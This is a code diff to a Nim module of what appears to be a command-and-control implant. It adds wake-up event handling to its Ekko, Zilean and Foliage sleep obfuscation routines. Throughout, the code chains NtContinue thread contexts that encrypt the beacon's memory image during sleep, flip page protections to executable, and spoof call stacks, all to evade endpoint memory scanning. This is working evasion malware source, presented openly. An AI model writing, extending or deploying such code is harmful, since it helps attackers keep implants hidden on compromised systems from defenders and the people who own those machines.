@@ -126,9 +126,18 @@ proc GetRandomThreadCtx(): CONTEXT =
     return ctx  
 
 #[
+    Delay execution without sleep obfuscation
+]#
+proc sleepNone(sleepDelay: int, hWakeupEvent: HANDLE) =
+    if hWakeupEvent != 0:
+        discard WaitForSingleObject(hWakeupEvent, cast[DWORD](sleepDelay))
+    else:
+        sleep(sleepDelay)
+
+#[
     Ekko sleep obfuscation based on Timers API using RtlCreateTimer
 ]#
-proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var bool = true) = 
+proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: HANDLE, spoofStack: var bool = true) =
     var 
         status: NTSTATUS = 0
         ctx: array[10, CONTEXT]
@@ -243,20 +252,20 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
             ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
             inc gadget
 
-        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
+        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached.
         ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rcx = cast[DWORD64](hWakeupEvent)               # Interrupt sleep on wake-up event (BeaconWakeUp()).
         ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
         ctx[gadget].R8  = cast[DWORD64](FALSE)
         inc gadget
-        
+
         # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
         ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
         ctx[gadget].Rcx = cast[DWORD64](addr img)
         ctx[gadget].Rdx = cast[DWORD64](addr key)
         inc gadget
 
-        if spoofStack: 
+        if spoofStack:
             # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
             ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
             ctx[gadget].Rcx = cast[DWORD64](hThread)
@@ -270,14 +279,14 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
         ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
         ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
         inc gadget
-        
+
         # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
         ctx[gadget].Rip = cast[DWORD64](apis.NtSetEvent)
         ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
         ctx[gadget].Rdx = cast[DWORD64](NULL)
 
         # Executing timers
-        for i in 0 .. gadget: 
+        for i in 0 .. gadget:
             delay += 100
 
             status = apis.RtlCreateTimer(queue, addr timer, apis.NtContinue, addr ctx[i], delay, 0, WT_EXECUTEINTIMERTHREAD)
@@ -293,14 +302,13 @@ proc sleepEkko(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var b
         print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
-        sleep(sleepDelay)
+        sleepNone(sleepDelay, hWakeupEvent)
         print protect("[-] "), err.msg
-
 
 #[
     Zilean sleep obfuscation based on Timers API using RtlRegisterWait
 ]#
-proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var bool = true) = 
+proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: HANDLE, spoofStack: var bool = true) =
     var 
         status: NTSTATUS = 0
         ctx: array[10, CONTEXT]
@@ -412,20 +420,20 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
             ctx[gadget].Rdx = cast[DWORD64](addr ctxSpoof)
             inc gadget
 
-        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
+        # ctx[5] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached.
         ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rcx = cast[DWORD64](hWakeupEvent)              # Interrupt sleep on wake-up event (BeaconWakeUp()).
         ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
         ctx[gadget].R8  = cast[DWORD64](FALSE)
         inc gadget
-        
+
         # ctx[6] contains the call to SystemFunction032 to decrypt the previously encrypted payload memory
         ctx[gadget].Rip = cast[DWORD64](apis.SystemFunction032)
         ctx[gadget].Rcx = cast[DWORD64](addr img)
         ctx[gadget].Rdx = cast[DWORD64](addr key)
         inc gadget
 
-        if spoofStack: 
+        if spoofStack:
             # ctx[7] calls SetThreadContext to restore the original thread context from the previously saved CtxBackup.
             ctx[gadget].Rip = cast[DWORD64](SetThreadContext)
             ctx[gadget].Rcx = cast[DWORD64](hThread)
@@ -439,14 +447,14 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
         ctx[gadget].R8  = cast[DWORD64](PAGE_EXECUTE_READWRITE)
         ctx[gadget].R9  = cast[DWORD64](addr oldProtection)
         inc gadget
-        
+
         # ctx[9] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
         ctx[gadget].Rip = cast[DWORD64](apis.NtSetEvent)
         ctx[gadget].Rcx = cast[DWORD64](hEventEnd)
         ctx[gadget].Rdx = cast[DWORD64](NULL)
 
         # Executing timers
-        for i in 0 .. gadget: 
+        for i in 0 .. gadget:
             delay += 100
             status = apis.RtlRegisterWait(addr timer, hEventWait, cast[PWAIT_CALLBACK_ROUTINE](apis.NtContinue), addr ctx[i], delay, WT_EXECUTEONLYONCE or WT_EXECUTEINWAITTHREAD)
             if status != STATUS_SUCCESS: 
@@ -461,14 +469,13 @@ proc sleepZilean(apis: Apis, key, img: USTRING, sleepDelay: int, spoofStack: var
         print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
-        sleep(sleepDelay)
+        sleepNone(sleepDelay, hWakeupEvent)
         print protect("[-] "), err.msg
         
-
 #[
     Foliage sleep obfuscation based on Asynchronous Procedure Calls
 ]#
-proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) = 
+proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int, hWakeupEvent: HANDLE) =
     var 
         status: NTSTATUS = 0
         ctx: array[7, CONTEXT]
@@ -527,9 +534,9 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         ctx[gadget].Rdx = cast[DWORD64](addr key)
         inc gadget
 
-        # ctx[3] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached. 
+        # ctx[3] contains the call to WaitForSingleObjectEx, which delays execution and simulates sleeping until the specified timeout is reached.
         ctx[gadget].Rip = cast[DWORD64](WaitForSingleObjectEx)
-        ctx[gadget].Rcx = cast[DWORD64](GetCurrentProcess())
+        ctx[gadget].Rcx = cast[DWORD64](hWakeupEvent)               # Interrupt sleep on wake-up event (BeaconWakeUp()).
         ctx[gadget].Rdx = cast[DWORD64](cast[DWORD](sleepDelay))
         ctx[gadget].R8  = cast[DWORD64](FALSE)
         inc gadget
@@ -572,9 +579,8 @@ proc sleepFoliage(apis: Apis, key, img: USTRING, sleepDelay: int) =
         print protect("[*] Sleep obfuscation end.")
 
     except CatchableError as err: 
-        sleep(sleepDelay)
+        sleepNone(sleepDelay, hWakeupEvent)
         print protect("[-] "), err.msg
-
 
 # Function to determine whether the agent currently operates within the configured working hours
 proc withinWorkingHours(workingHours: WorkingHours): bool =     
@@ -593,9 +599,9 @@ proc withinWorkingHours(workingHours: WorkingHours): bool =
     return true 
 
 # Sleep obfuscation implemented in various techniques
-proc sleepObfuscate*(sleepSettings: SleepSettings) = 
-    
-    if sleepSettings.sleepDelay == 0: 
+proc sleepObfuscate*(sleepSettings: SleepSettings, hWakeupEvent: HANDLE) =
+
+    if sleepSettings.sleepDelay == 0:
         return 
 
     # Initialize required API functions 
@@ -650,11 +656,11 @@ proc sleepObfuscate*(sleepSettings: SleepSettings) =
 
     # Execute sleep obfuscation technique
     case sleepSettings.sleepTechnique:
-    of EKKO: 
-        sleepEkko(apis, key, img, delay, sleepSettings.spoofStack)
-    of ZILEAN: 
-        sleepZilean(apis, key, img, delay, sleepSettings.spoofStack)
+    of EKKO:
+        sleepEkko(apis, key, img, delay, hWakeupEvent, sleepSettings.spoofStack)
+    of ZILEAN:
+        sleepZilean(apis, key, img, delay, hWakeupEvent, sleepSettings.spoofStack)
     of FOLIAGE:
-        sleepFoliage(apis, key, img, delay)
+        sleepFoliage(apis, key, img, delay, hWakeupEvent)
     of NONE:
-        sleep(delay)
+        sleepNone(delay, hWakeupEvent)
